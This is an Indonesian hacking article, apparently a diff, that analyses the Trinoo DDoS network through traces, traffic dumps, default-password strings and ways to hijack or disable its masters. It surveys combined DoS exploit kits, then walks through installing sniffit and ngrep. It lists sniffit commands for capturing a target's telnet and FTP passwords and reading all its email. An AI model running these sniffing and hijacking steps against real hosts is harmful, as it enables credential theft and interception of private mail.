+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+ . . .
+*******************************************************************
+
+Sedangkan apabila kita lihat lalu-lintas jaringan selama terjadinya 
+penyerangan terhadap single target (seperti yang kita lihat dengan 
+menggunakan "tcpdump") akan terlihat seperti di bawah ini :
+
+*******************************************************************
+# tcpdump ip host 192.168.0.1
+ . . .
+15:40:08.491782 10.0.0.1.1024 > 192.168.0.1.27444: udp 25
+15:40:08.574453 192.168.0.1.32885 > 216.160.XX.YY.16838: udp 4 (DF)
+15:40:08.576427 192.168.0.1.32885 > 216.160.XX.YY.5758: udp 4 (DF)
+15:40:08.579752 192.168.0.1.32885 > 216.160.XX.YY.10113: udp 4 (DF)
+15:40:08.583056 192.168.0.1.32885 > 216.160.XX.YY.17515: udp 4 (DF)
+15:40:08.600948 192.168.0.1.32885 > 216.160.XX.YY.31051: udp 4 (DF)
+15:40:08.604943 192.168.0.1.32885 > 216.160.XX.YY.5627: udp 4 (DF)
+15:40:08.610886 192.168.0.1.32885 > 216.160.XX.YY.23010: udp 4 (DF)
+15:40:08.614202 192.168.0.1.32885 > 216.160.XX.YY.7419: udp 4 (DF)
+15:40:08.615507 192.168.0.1.32885 > 216.160.XX.YY.16212: udp 4 (DF)
+15:40:08.616854 192.168.0.1.32885 > 216.160.XX.YY.4086: udp 4 (DF)
+15:40:08.618827 192.168.0.1.32885 > 216.160.XX.YY.2749: udp 4 (DF)
+15:40:08.623480 192.168.0.1.32885 > 216.160.XX.YY.12767: udp 4 (DF)
+15:40:08.625458 192.168.0.1.32885 > 216.160.XX.YY.9084: udp 4 (DF)
+15:40:08.628764 192.168.0.1.32885 > 216.160.XX.YY.12060: udp 4 (DF)
+15:40:08.632090 192.168.0.1.32885 > 216.160.XX.YY.32225: udp 4 (DF)
+ . . .
+*******************************************************************
+
+
+KELEMAHAN TRINOO
+*******************************************************************
+
+Kelemahan yang pertama adalah password-password yang dienkripsi 
+dengan crypt (), dan beberapa prompt dan return strings, yang 
+dapat terlihat dalam image biner master dan daemon.
+
+Hal tersebut di atas mempunyai dampak bahwa seseorang atau hacker 
+lain dapat mengidentifikasi master dan daemon yang ditemukannya, 
+men-determinisasikan apakah password yang digunakannya adalah 
+default  seperti yang dibahas dalam artikel ini atau bukan, 
+dan menyebabkan adanya potensi seseorang atau hacker lainnya 
+untuk memanfaatkan kelemahan password tersebut untuk mengambil 
+alih kendali beberapa atau semua jaringan trinno yang telah kita buat.
+
+Jika source code-nya telah dimodifikasi (biasanya dilakukan oleh 
+attacker yang pandai dalam penguasaan program C), 
+temen-temen harus meng-crack password-nya terlebih dahulu. 
+Jika temen-temen menginginkannya, temen-temen bisa menggunakan 
+sebuah editor hexadecimal / ASCII (misalnya ; "xxd", yang 
+merupakan bagian dari VIM editor suite) dan mengubahnya kedalam 
+binary image, yang selanjutnya, sebagai contoh, jalankan 
+master untuk mendapatkan daftar dari daemon-daemon tersebut.
+
+jika anda mengalami kesulitan akan hal di atas, anda bisa 
+meng-observasi string dalam program biner-nya, seperti yang saya 
+contohkan di bawah ini (apabila menggunakan default password) :
+
+*******************************************************************
+# strings - ns
+ . . .
+socket
+bind
+recvfrom
+%s %s %s
+aIf3YWfOhw.V.	<=== password "144adsl" yang dienkripsi menggunakan crypt ()
+PONG			
+*HELLO*
+ . . .
+
+# strings - master
+ . . .
+---v
+v1.07d2+f3+c
+trinoo %s
+l44adsl		<=== versi clear text dari password daemon.
+sock				
+0nm1VNMXqRMyM	<=== password "g0rave" yang dienkripsi menggunakan crypt ()
+10:09:24		
+Sep 26 1999
+trinoo %s [%s:%s]
+bind
+read
+*HELLO*
+ZsoTN.cq4X31	<=== CRYPTKEY
+bored
+NEW Bcast - %s
+PONG
+PONG %d Received from %s
+Warning: Connection from %s
+beUBZbLtK7kkY	<=== password "betaalmostdone" yang dienkripsi menggunakan crypt ()
+trinoo %s..[rpm8d/cb4Sx/] 
+ . . .				 
+DoS: usage: dos 
+DoS: Packeting %s.
+aaa %s %s
+mdie
+ErDVt6azHrePE	<===  Password untuk perintah "mdie" yang dienkripsi menggunakan crypt ().
+mdie: Disabling Bcasts.  
+d1e %s				
+mdie: password?
+ . . .
+*******************************************************************
+
+Selanjutnya, dan sangat vulnerable, adalah password daemon, 
+yang berjalan dalam jaringan dengan menggunakan format clear text. 
+Kita asumsikan bahwa anda mengetahui adanya komunikasi yang 
+dilakukan oleh master kepada client dengan menggunakan port UDP, 
+selanjutnya anda bisa meng-capture (menangkap) password-nya 
+menggunakan program "sniffit", atau "ngrep", atau "tcpdump", 
+atau program lainnya yang mampu memonitoring jaringan atau 
+mampu menangkap paket data UDP. 
+
+Sebagai contoh, inilah perintah "png" yang dikirim terhadap 
+trinoo daemon yang ditangkap oleh program "sniffit" :
+
+*******************************************************************
+UDP Packet ID (from_IP.port-to_IP.port): 10.0.0.1.1024-192.168.0.1.27444
+ 45 E 00 . 00 . 27 ' 1A . AE . 00 . 00 . 40 @ 11 . 47 G D4 . 0A . 00 . 00 . 01 .
+ C0 . A8 . 00 . 01 . 04 . 00 . 6B k 34 4 00 . 13 . 2F / B7 . 70 p 6E n 67 g 20  
+ 6C l 34 4 34 4 61 a 64 d 73 s 6C l
+*******************************************************************
+
+Seperti yang telah dijelaskan di awal, bahwa perintah "mdie" 
+dalam trinoo master password-nya diproteksi dalam program 
+master itu sendiri. untuk itu terdapat beberapa cara untuk 
+melakukan penyerangan terhadapnya.
+
+Jika anda mampu mendeterminisasikan string cript () yang 
+dienkripsi menggunakan perintah "strings"-nya Unix, anda 
+kemudian bisa menggunakan sebuah utilitas password cracking, 
+seperti program "crack", yang kemudian pecahkanlah kode tersebut. 
+Akan tetapi hal ini akan membutuhkan waktu yang lama jika password 
+yang dibuatnya sangat baik (tentu anda mengetahui konsep pembuatan 
+password yang baik ini), satu hal yang perlu anda ketahui bahwa 
+password yang dienkripsi tersebut sangat mungkin untuk bisa kita 
+pecahkan (Seperti yang pernah saya lakukan / teliti ternyata 
+password "killme" untuk perintah "mdie" bisa kita pecahkan kodenya 
+(crack) kurang dari 30 detik menggunakan Pentium II).
+
+Anda bisa mencoba untuk menangkap password ketika terjadi 
+komunikasi antara attacker kepada master yang berjalan di 
+dalam kabel jaringan, tetapi kiranya perintah ini tidak 
+akan sering digunakan oleh penyerang. Jika tidak digunakan 
+sama sekali, maka anda harus memonitor terus jaringan yang 
+dipakai untuk komunikasi tersebut dimana ketika mereka 
+mencoba untuk mengaktifkan daemon yang diperlukan untuk 
+penyerangan disanalah anda siap-siap untuk meng-capture 
+kode password tersebut.
+
+Anda mungkin punya keberuntungan lebih daripada penulis 
+untuk sniffing password daemon tersebut, ketika mereka 
+mulai melakukan banyak perintah terhadap master atau daemon. 
+Hal ini bisa dilakukan terhadap jaringan master-master atau 
+daemon-daemon yang lain (biasanya mereka menginstalasi trinoo 
+master atau daemon pada network-network yang berbeda, tergantung 
+pada jaringan-jaringan mana yang telah mereka kuasai/compromise). 
+Trinoo master biasanya banyak ditemukan dan di-set pada primary 
+name server daripada daemon, disebabkan mungkin karena besarnya 
+traffic pada port-port UDP dan yang jelasnya saya kurang mengetahui 
+banyak tentang hal itu….sorry….Huhuuuu…..!!!
+
+Tapi begini…..sekali anda mengetahui lokasi daemon pada sebuah 
+jaringan, anda juga bisa mengetahui dan menemukan daftar alamat-
+alamat IP dari master-master tersebut (gunakan "strings" untuk 
+melihatnya). Kemudian secepatnya anda kontak/hubungi site tersebut 
+dan yakinkan mereka untuk memeriksa sistemnya dan beritahu bahwa 
+sistemnya telah di-intrusi, atau beritahu mereka untuk memeriksa 
+ada tidaknya instalasi "root kit" yang membuat trinoo master 
+atau daemon sulit untuk di-deteksi, dan juga yang berusaha untuk 
+mengkoordinir sebuah respon.
+
+Setelah anda menemukan sebuah master, daftar dari daemon-daemon 
+(yang mungkin didalamnya termasuk host-host dari berbagai site 
+yang lain) bisa anda peroleh hanya dengan mengidentifikasi file 
+yang berisi daftar tersebut, jika tidak di enkripsi.Tetapi jika….
+hauahhhhhhh bagaimanapun juga, seandainya…..heheh file tersebut 
+dienkripsi, anda harus men-decrypt file yang dienkripsi menggunakan 
+blowfish tersebut dengan menggunakan kunci yang sama yang di-compile 
+kedalam program, atau dengan mengambil alih kontrol master dan kemudian 
+gunakan perintah "bcast".
+
+Jika anda telah dapat mengidentifikasi sesi command yang aktif 
+ke sebuah master, yang mana merupakan sebuah sesi TCP gaya 
+standard "telnet", anda bisa meng-hijack sesi tersebut 
+menggunakan "hunt" dan anda bisa mulai meng-eksekusi 
+perintah-perintah tersebut. Jika anda tidak mengetahui 
+password dari perintah "mdie", maka anda tidak bisa 
+men-disable semua daemon secara langsung, tetapi anda 
+masih bisa menggunakan perintah "bcast" untuk mendapatkan 
+semua daftar dari daemon tersebut (anda mungkin ingin 
+melakukan hal ini dengan menggunakan perintah "script" 
+yang akan meng-generate transkrip dari sesi tersebut, 
+transkrip tersebut bisa jadi merupakan suatu daftar 
+yang sangat besar).
+
+Sekali anda mengetahui alamat-alamat dari semua daemon d
+an password-password-nya (akan terlihat dalam outputnya 
+apabila kita menggunakan "string"), anda kemudian bisa 
+mengirimkan string perintah yang sesuai ke dalam paket-
+paket UDP ke semua trinoo daemon yang kita curigai. 
+Penciptaan dan transmisi paket-paket UDP dapat kita 
+tangkap dengan menggunakan tool-tool seperti LibNet, 
+Spak, the Perl Net::RawIP library, dan lain-lain.
+
+Instalasi tipikal dari daemon meliputi sebuah crontab 
+entry yang berjalan pada tiap menit, anda harus secara 
+konstan memonitoring semua network untuk menjaga agar 
+daemon tidak re-start (biasanya dengan  memakai sedikit 
+perintah "png" ke setiap daemon). **** hal ini mungkin 
+ada kaitannya dengan bug-bug dalam pemrogramannya, yang 
+menyebabkan adakalanya daemon crash, atau mungkin untuk 
+menguji/mengalahkan system administrator yang biasanya 
+hanya secara sederhana menyimpulkan dan membunuh proses 
+tersebut tanpa berpikir untuk mencheck crontab entry 
+yang mere-start daemon tersebut ****.
+
+Daemon juga bisa anda temukan dalam jaringan anda dengan 
+cara men-sniffing porsi  paket-paket data UDP untuk string 
+"*HELLO*" dan "PONG", atau beberapa string-string perintahnya 
+(sampai source-nya dimodifikasi untuk merubah string-string 
+ini). Untuk hal tersebut, saya beri contoh dengan menggunakan 
+program "ngrep" di bawah ini :
+
+*******************************************************************
+# ngrep -i -x "*hello*|pong" udp
+interface: eth0 (192.168.0.200/255.255.255.0)
+filter: ip and ( udp )
+match: *hello*|pong
+ . . .
+#
+U 192.168.0.1:32887 -> 10.0.0.1:31335
+  2a 48 45 4c 4c 4f 2a                                  *HELLO*         
+###
+U 192.168.0.1:32888 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+U 192.168.0.3:32815 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+U 192.168.0.5:32798 -> 10.0.0.1:31335
+  50 4f 4e 47                                           PONG            
+ . . .
+*******************************************************************
+
+Selain kelemahan yang terdapat dalam program trinoo itu sendiri, 
+terdapat juga kelemahan dalam cara men-setup jaringan trinoo.
+
+Seperti yang telah saya tulis di atas, beberapa system akan 
+memperlihatkan crontab-crontab entry-nya yang digunakan untuk 
+men-start daemon sekali setiap menitnya. Hal ini jelas-jelas 
+akan meninggalkan fingerprint dalam crontab file-nya.
+
+Script-script yang telah diobservasi untuk mengotomatisasikan 
+instalasi dari jaringan trinoo yang menggunakan perintah "rcp" 
+Barkeley (penggunaan dari rcp juga telah di observasi dalam 
+kemampuannya meng-upload file untuk merubah kembali file 
+yang telah diinstalasi menjadi versi yang terbaru dalam 
+hal ini program daemonnya "Tribe Flood Network"). 
+Memonitoring koneksi "rcp" (514/tcp) dari multiple system 
+dalam jaringan anda, dalam rangkaian yang cepat, ke sebuah 
+single IP address di luar jaringan anda akan menjadi suatu 
+pemicu yang baik. (hal yang perlu dicatat bahwa penggunaan 
+"rcp" dalam sebuah script memerlukan sebuah anonymous trust 
+relationship, biasanya dalam bentuk "+ +" didalam sebuah 
+file user ~/.rhost).
+
+GENERASI LAINNYA DARI EXPLOIT DoS 
+*******************************************************************
+
+Salah satu serangan yang paling gampang dilakukan adalah denial of 
+serice attack (DoS). Beberapa bug yang terdapat dalam TCP/IP stack, 
+misalnya, mengijinkan adanya paket-paket yang di-fragmentasikan, 
+paket-paket yang besar, IP option, koneksi half-open TCP, atau 
+mem-flooding paket-paket (bandwith yang tertinggi yang terbaik), 
+dan lain-lain, menyebabkan system performance menjadi turun, 
+atau menyebabkan system menjadi crash. 
+
+Yang kemudian bug-bug ditemukan, lalu sebuah program eksploitasi 
+dibuat untuk menunjukkan adanya bug tersebut. Setiap program-program 
+eksploitasi ini biasanya unik, exploitasi sebuah bug secara spesifik 
+yang mungkin hanya mempengaruhi implementasi sebuah single TCP/IP 
+(Microsoft yang sekarang ini menguasai pangsa pasar dunia untuk 
+personal komputer, yang mana pengguna rumahan (home user) 
+hampir semuanya tidak peduli terhadap adanya, seperti contohnya 
+bug-bug ini, biarkanlah dia sendiri dimana mendapatkan dan bagaimana 
+menerapkan patch-patchnya untuk memperbaiki bug-bug ini, resikonya 
+sangat tinggi sekali yang mana serangan multi-exploit akan membuat 
+crash system target…...!!)
+
+Generasi selanjutnya dari eksploit DoS ini adalah mengkombinasikan 
+berbagai eksploit denial of service kedalam satu tool, dengan 
+menggunakan script shell Unix. Salah satunya tool yang diberi 
+nama "rape", (menurut kodenya / yang tercatat dalam kodenya, 
+tool tersebut ditulis pada tahun 1998 oleh "mars", dengan 
+modifikasi oleh "TheVirus" dan kemudian di improvisasi lebih 
+lanjut oleh "ttol") tool tersebut menggabungkan berbagai exploit 
+kedalam sebuah single shell script, tool-tool yang digabungkan 
+tersebut yaitu :
+
+*******************************************************************
+  echo "Editted for use with www.ttol.base.org"
+  echo "rapeing $IP. using weapons:"
+  echo  "latierra          	"
+  echo -n "teardrop v2        "
+  echo -n "newtear           	"
+  echo -n "boink             	"
+  echo -n "bonk              	"
+  echo -n "frag              	"
+  echo -n "fucked            	"
+  echo -n "troll icmp        	"
+  echo -n "troll udp         	"
+  echo -n "nestea2            "
+  echo -n "fusion2           	"
+  echo -n "peace keeper      	"
+  echo -n "arnudp            	"
+  echo -n "nos               	"
+  echo -n "nuclear           	"
+  echo -n "ssping            	"
+  echo -n "pingodeth         	"
+  echo -n "smurf            	"
+  echo -n "smurf4            	"
+  echo -n "land             	"
+  echo -n "jolt              	"
+  echo -n "pepsi             	"
+*******************************************************************
+
+Tool seperti ini mempunyai keuntungan terhadap attacker untuk menyerang 
+single IP address dengan serangan yang beraneka ragam dengan tingkat 
+kemungkinan sukses serangannya lebih tinggi. Seperti juga halnya 
+dengan tool seperti "targa.c" yang dibuat oleh Mixter, dimana tool 
+"targa" ini mengkombinasikan semua exploit di atas (seperti, jolt, 
+land, nestea, newtear, syndrop, teardrop, winnuke, dll) dengan single C 
+source program (dimana dengan hanya menggunakan satu source program 
+yaitu program C, akan membuat program pre-compile tersebut mudah 
+untuk di simpan, di transfer, dan bisa digunakan dengan lebih cepat) :
+
+*******************************************************************
+/* targa.c - copyright by Mixter 
+   version 1.0 - released 6/24/98 - interface to 8
+   multi-platform remote denial of service exploits
+*/                                                                             
+ . . .
+
+/* bonk by route|daemon9 & klepto
+ * jolt by Jeff W. Roberson (modified by Mixter for overdrop effect)
+ * land by m3lt
+ * nestea by humble & ttol
+ * newtear by route|daemon9
+ * syndrop by PineKoan
+ * teardrop by route|daemon9
+ * winnuke by _eci */                                                           
+*******************************************************************
+
+Walaupun tool "targa" ini mengkombinasikan tool-tool denial of 
+service tetapi hanya bisa digunakan untuk menyerang satu IP address  
+(single IP address) saja setiap waktunya.
+
+Untuk meningkatkan efektifitas serangan, biasanya grup penyerang 
+mengkoordinasikan  serangannya dengan menggunakan channel IRC 
+ataupun instant messenger ataupun memakai telepon untuk komunikasinya, 
+setiap orang menyerang sebuah sistem yang berbeda. Koordinasi seperti 
+ini sama seperti yang dilakukan dalam probing vurnerabilitas, dan 
+seperti yang dilakukan dalam mengkontrol dan meng-compromise dengan 
+menggunakan bermacam-macam backdoor ataupun "root kit".
+
+Artikel yang mungkin akan saya bahas selanjutnya yaitu (sekali lagi 
+"mungkin" karena keterbatasannya waktu penulis dalam membuat artikel-
+artikel seperti ini, atau mungkin saja penulis membuat/membahas artikel 
+yang lainnya tetapi masih dalam koridor menyusupkan tool DDOS atau 
+teknik pendukung lainnya. +++ Penulis menulis artikel seperti ini hanya 
+merupakan hobby saja dan penulis menganggap bahwa hacking merupakan 
+seni yang memiliki kepuasan tersendiri bagi penulis dan kita sama-sama 
+sharing  pengalaman, …………ok….!!?? mungkin anda juga tidak begitu 
+seharusnya...pasti dong…he +++) TFN (a.k.a Tribe Flood Network) 
+yang dibuat oleh Mixter. Sementara trinoo hanya mengimplementasikan 
+serangnya melalui flooding UDP, tetapi yang satu ini (TFN) mendukung 
+untuk penyerangannya melalui UDP flood, ICMP flood, SYN flood dan 
+smurf style attack, dan perintah-perintahnya dikontrol via paket-paket 
+ICMP_ECHOREPLY (ICMP tipe 0) dan juga di enkripsi menggunakan blowfish, 
+hampir sama dengan trinoo ataupun stacheldraht.Tetapi karena TFN 
+komunikasinya menggunakan protocol ICMP, hal ini menyebabkan firewall 
+sulit untuk mendeteksi atau mem-blok-nya.
+
+
+CATATAN TAMBAHAN :
+************************
+
+A. Instalasi Sniffit :
+*******************************************************************
+
+Apabila pada Redhat linux anda belum terinstalasi Sniffer (kita 
+akan menggunakan tool sniffit) atau anda ingin menginstalasi 
+sniffit pada Redhat linux anda, ada beberapa langkah yang 
+harus dilakukan dalam hal instalasinya :
+
+1. Terlebih dahulu anda harus menginstalasi tool yang dapat 
+   meng-capture transmisi paket-paket,kita bisa memakai LibNet, 
+   Spak, atau The Perl Net::RawIP Library. Dalam hal ini saya 
+   menginstalasi  libpcap-0.6.2-17.8.0.2.i386.rpm, anda bisa 
+   mendownloadnya di :
+
+	    http://linux.maruhn.com/sec/libpcap.html
+
+   silahkan anda memilih jenis mesin, jenis OS dan versi berapa 
+   yang ingin anda download. setelah anda download kemudian 
+   berikan perintah :
+	    
+	    rpm -ivh filename
+	    contoh : rpm -ivh  libpcap-0.6.2-17.8.0.2.i386.rpm
+
+   Atau bagi anda yang memilih format tar.gz anda dapat mendownload-
+      nya di : 
+
+      http://www.tcpdump.org/release.
+
+      Libpcap versi terbaru (semenjak tulisan ini di buat) adalah Libpcap-0.8.3.tar.gz, setelah
+      tool ini berhasil anda download, kalo saya biasanya disimpan di direktori /usr/local/src, 
+      kemudian anda harus mengetikkan perintah di bawah ini :
+     
+   $ tar -zxvf  libpcap-0.8.3.tar.gz
+      $ cd libcap_0_8rel_3
+   $ ./configure
+   $ make
+   $ su
+   password:********
+   # make install-incl
+   # make install-man
+   # exit
+
+2. Lalu anda harus menginstalasi tool "ncurses". silahkan anda 
+   cari dengan keyword "ncurses" dan sesuaikan dengan jenis mesin 
+   dan OS yang anda gunakan serta versinya. Atau yang umumnya 
+   memakai Redhat 9 bisa didownload di :
+
+	    http://download.fedoralegacy.org/redhat/9/os/i386/?C=M;O=D	
+   
+   Setelah file ncurses anda download silahkan anda berikan 
+   perintah seperti di atas :
+		
+	    rpm -ivh filename
+	    contoh : rpm -ivh  ncurses4-5.0-11.i386.rpm
+
+3. Barulah kemudian anda download tool sniffit. Tool ini bisa anda 
+   dapatkan di :
+
+	    http://sniffit.rug.ac.be/sniffit/sniffit.html
+
+   Versi terbaru dari sniffit adalah versi 0.3.7 beta. Apabila anda 
+   mendownload dari situs ini anda akan mendapatkan sniffit dalam 
+   format tar.gz, yaitu sniffit.0.3.7.beta.tar.gz.Setelah anda 
+   mendownloadnya kemudian ikuti perintah di bawah ini :
+	  
+	    a. tar -zxvf sniffit.0.3.7.beta.tar.gz
+	    b. cd sniffit.0.3.7.beta
+	    c. ./configure
+	    d. make
+	    e. make clean <= Other stuff.
+
+   atau bagi anda yang menggunakan OS Radhat dan ingin langsung 
+   menggunakannya secara simpel anda bisa mencari file rpm-nya dan 
+   bisa anda download di :
+	     
+	     http://rpm.pbone.net/index.php3/stat/4/idpl/2048/com/
+           sniffit-0.3.7beta-1.i386.rpm
+
+   Setelah anda download silahkan gunakan perintah di bawah ini :
+
+	    rpm -ivh filename
+	    contoh : rpm -ivh sniffit-0.3.7.beta-1.i386.rpm
+
+   Setelah sniffit terinstalasi anda tinggal langsung menggunakannya, 
+   tetapi anda harus dalam mode super user (root ), coba anda lihat 
+   di bawah ini :
+
+   # sniffit
+   usage: sniffit [-xdabvnN] [-P proto] [-A char] [-p port] [(-r|-R) recordfile]
+          [-l sniflen] [-L logparam] [-F snifdevice] [-M plugin]
+	    [-D tty] (-t<Target IP> | -s<Source IP>) | (-i|-I) | -c<config file>]
+
+	     Plugins Available:
+   		0 -- Dummy Plugin 
+		1 -- DNS Plugin
+
+Contoh-contoh penggunaan Sniffit :
+**********************************
+
+Coba anda bayangkan yang berikut ini : Terdapat 2 host dalam sebuah 
+subnet, yang satu menjalankan sniffer (sniffit.com) +++ bayangkan 
+anda yang menjalankan sniffer +++ dan yang satu lagi adalah 
+targetnya dengan IP 69.aa.171.138 (target.com) :
+
+1. Jika anda ingin mengetes apakah sniffer yang anda install tadi 
+   sudah dapat bekerja dengan baik ?, coba anda ikuti perintah 
+   dibawah ini :
+
+   # sniffit -d -p 7 -t 69.aa.171.138
+	   
+   -d	mode dump, untuk memperlihatkan paket-paket ke layar 
+	di dalam bytes (tidak seperti yang ditunjukkan oleh tcp dump). 
+   -p	Port yang digunakan. dalam testing ini menggunakan port 7
+   -t	Target.
+
+   Setelah anda memberikan perintah tersebut, kemudian tekan enter, 
+   maka yang akan terjadi adalah seperti yang akan anda lihat  
+   di bawah ini :
+
+   # sniffit -d -p 7 -t 69.aa.171.138
+   Supported Network device found. (eth0)
+   Sniffit.0.3.7 Beta is up and running.... (69.aa.171.138)
+
+   Itu berarti program sniffer (sniffit) tersebut telah berjalan dan 
+   siap untuk menangkap / men-capture paket-paket (user id dan password) 
+   seandainya ada yang login ke target.com lewat port 7. Program ini 
+   akan terus memonitoring target.com lewat port 7 selama program 
+   tersebut tidak kita hentikan (^C). Untuk testing, bagaimanakah 
+   contoh dari paket-paket yang dikirim ke target.com tersebut dapat 
+   kita capture/tangkap ? coba anda pakai komputer lain atau komputer 
+   yang  itu juga dengan menggunakan konsol yang berbeda dan konek ke 
+   target.com (69.56.171.138) lewat program telnet dengan menggunakan 
+   port 7 (dengan syarat bahwa sniffer anda sedang aktif / sedang 
+   berjalan / anda  jangan mematikan proses yang berjalan dengan 
+   perintah yang digunakan di atas). Misal : anda menjalankan sniffer 
+   di konsol 1 dengan perintah :
+
+   # sniffit -d -p 7 -t 69.56.171.138 
+
+   kemudian buka konsol 2 dan konek ke target.com lewat telnet port 7, 
+   perhatikan contoh di bawah :
+
+   $ telnet 69.aa.171.138 7
+   Trying 69.aa.171.138...
+   telnet : connect to adress 69.aa.171.138 : Connection refused
+
+   Coba anda buka kembali konsol 1 yang menjalankan sniffer, coba 
+   lihat di bawah ini :
+
+   # sniffit -d -p 7 -t 69.aa.171.138
+   Supported Network device found. (eth0)
+   Sniffit.0.3.7 Beta is up and running.... (69.aa.171.138)
+
+   Packet ID (from_IP.port-to_IP.port): 192.168.0.11.2576-69.aa.171.138.7
+   45 10 00 3C 6F 87 40 00 40 06 19 AF C0 A8 00 0B 45 38 AB 8A 0A 10 00 07 2E 5F
+   E6 20 00 00 00 00 A0 02 16 D0 D7 76 00 00 02 04 05 B4 04 02 08 0A 00 0C 89 A7 
+   00 00 00 00 01 03 03 00
+
+   Ternyata sniffer tersebut dapat menangkap paket-paket  yang dikirimkan 
+   ke target.com (dalam hal ini paket yang dikirimkan dari konsol 2 ke 
+   target.com). Good job...man !!!
+
+2. Jika anda ingin mengetahui password-password yang masuk dari 
+   target.com :
+	     
+   # sniffit -p 23 -t 69.aa.171.138
+
+3. Root dari target.com mengatakan bahwa dia menerima koneksi 
+   ftp yang perlu dicurigai dan anda ingin mengetahuinya, 
+   perintah yang diberikan adalah :
+
+   # sniffit -p 21 -l 0 -t 69.aa.171.138
+
+4. Jika anda ingin membaca semua email yang masuk atau keluar 
+   dari target.com :
+
+   # sniffit -p 25 -l 0 -b -t 69.aa.171.138 &
+
+   atau
+
+   # sniffit -p 25 -l 0 -b -s 69.aa.171.138 &
+
+5. Jika anda ingin mengetahui kesalahan dan anda ingin melihat 
+   kontrol message dan kode-kode error-nya :
+
+   # sniffit -P icmp -b -s 69.aa.171.138
+
+6. Go wild on scrolling the screen........!!!!
+
+   # sniffit -P ip -P icmp -P tcp -p 0 -b -a -d -x -s 69.aa.171.138
+      
+   atau
+
+   # sniffit -P ipicmptcp -p 0 -b -a -d -x -s 69.aa.171.138
+
+7. Jika ingin melihat log password yang dengan jalan ini anda bisa 
+   membacanya dengan "lebih dari 69*" :
+
+   # sniffit -p 23 -A . -t 66.66.66.7
+
+   atau
+       
+   # sniffit -p 23 -A ^ -t dummy.net
+
+8. Jika anda ingin mengetahui lebih banyak kombinasi dari perintah-
+   perintahnya silahkan anda :
+
+   # man sniffit
+
+Ok...? Udah mulai boring neh......!!!!??
+Yang perlu dicatat : 
+1. Anda perlu kesabaran tinggi untuk men-sniffing target.
+2. Biarkan proses/program sniffit ini berjalan terus, sampai 
+   ada orang yang login ke situs target.
+3. Dengan program ini anda bisa sniffing lewat ssh, telnet,ftp, 
+   mail, dll. (biasanya kalo kita memonitoring/sniffing jaringan 
+   telnet, passwordnya dalam bentuk clear text).
+
+
+B. Instalasi Ngrep :
+*******************************************************************
+
+Ngrep adalah sebuah tool yang digunakan untuk memonitoring 
+lalu lintas jaringan (sama halnya dengan tool sniffit).
+Ngrep ini di dasarkan pada libpcap library, yang mempunyai fungsi 
+untuk meng-capture/menangkap paket-paket, oleh karena itu sebelum anda 
+menginstalasi ngrep, anda terlebih dahulu harus menginstalasi Libpcap pada 
+Linux/Unix anda, bagi yang mengikuti tutorial di atas dengan sebuah praktek 
+atau bagi anda yang sebelumnya telah menginstal Libpcap anda tidak perlu
+lagi menginstal libcap. Bagi anda yang belum menginstall Libpcap, ikutilah 
+seperti petunjuk di atas. Source ngrep dapat anda download di :
+
+http://www.packetfactory.net/Projects/ngrep
+
+Setelah anda dapat mendownloadnya, ikuti perintah-perintah dibawah ini :
+
+$ tar -zxvf ngrep-1.42.tar.gz
+$ cd ngrep
+$ ./configure
+$ make
+$ su
+password: **********
+# make install
+# exit
+
+Sampai disini anda telah berhasil menginstall ngrep pada linux/unix anda.
+Tetapi apabila anda ingin memilih format rpm dalam mengintall ngrep pada 
+linux redhat anda, package-nya dapat anda download di :
+
+http://dag.wieers.com/packages/ngrep/
+
+Silahkan anda pilih Jenis OS yang anda gunakan dan jenis mesin komputer
+yang anda pakai. Setelah ngrep anda download selanjutnya berikan perintah
+seperti di atas :
+
+# rpm -ivh filename
+Contoh : rpm -ivh ngrep-1.42-1.rh62.1386.rpm
+
+Selamat anda telah berhasil menginstall ngrep pada linux anda.
+
+
+Beberapa Contoh Penggunaan Ngrep :
+**********************************
+
+1. Seandainya anda telah mengetahui adanya komunikasi yang 
+   dilakukan oleh master ke client trinoo dengan menggunakan
+   port UDP, selanjutnya anda dapat meng-capture password-nya
+   dengan menggunakan perintah :
+
+   # ngrep -x ".*" tcp port 27665 or udp port 31335 or udp port 27444
+   interface: eth0 (192.168.0.200/255.255.255.0)
+   filter: ip and ( tcp port 27665 or udp port 31335 or udp port 27444 )
+   match: .*
+   #
+   U 192.168.0.1:32892 -> 10.0.0.1:31335
+     2a 48 45 4c 4c 4f 2a                                  *HELLO*         
+   #
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     ff f4 ff fd 06                                        .....           
+   ######
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     62 65 74 61 61 6c 6d 6f    73 74 64 6f 6e 65 0d 0a    betaalmostdone..
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     74 72 69 6e 6f 6f 20 76    31 2e 30 37 64 32 2b 66    trinoo v1.07d2+f
+     33 2b 63 2e 2e 5b 72 70    6d 38 64 2f 63 62 34 53    3+c..[rpm8d/cb4S
+     78 2f 5d 0a 0a 0a                                     x/]...          
+   ##
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     74 72 69 6e 6f 6f 3e 20                               trinoo>         
+   ###
+   T 192.168.100.1:1074 -> 10.0.0.1:27665 [AP]
+     62 63 61 73 74 0d 0a                                  bcast..         
+   #
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     4c 69 73 74 69 6e 67 20    42 63 61 73 74 73 2e 0a    Listing Bcasts..
+     0a                                                    .               
+   ###
+   T 10.0.0.1:27665 -> 192.168.100.1:1074 [AP]
+     31 39 32 2e 31 36 38 2e    30 2e 31 2e 20 20 20 0a    192.168.0.1.
+     0a 45 6e 64 2e 20 31 20    42 63 61 73 74 73 20 74    .End. 1 Bcasts t
